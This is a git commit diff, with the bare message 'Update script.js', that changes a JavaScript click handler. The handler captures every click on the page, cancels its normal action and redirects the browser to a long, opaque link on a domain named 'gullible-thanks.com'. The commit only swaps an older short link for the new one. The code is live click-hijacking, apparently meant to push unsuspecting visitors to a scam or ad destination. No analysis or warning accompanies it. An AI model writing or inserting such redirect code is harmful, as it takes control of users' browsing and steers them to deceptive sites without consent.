b321fb1c6602410a9838f8b3f09fb32255413b3a
MinerDH <149313062+MinerDH@users.noreply.github.com>
2026-05-13 20:32:01 +0000

    Update script.js

--- script.js
+++ script.js
@@ -3,6 +3,6 @@ window.addEventListener('click', (event) => {
         event.preventDefault();
         event.stopPropagation();
         
-        window.location.href = 'https://gullible-thanks.com/alhQLv';
+        window.location.href = 'https://gullible-thanks.com/bw3kV.0sPd3yp/vCbXmXVyJ/ZTDe0F3mMcD-QcyTM/zEgv5ELmTkciwfNDDyIBzQOiTXMx';
     }
 }, true); 
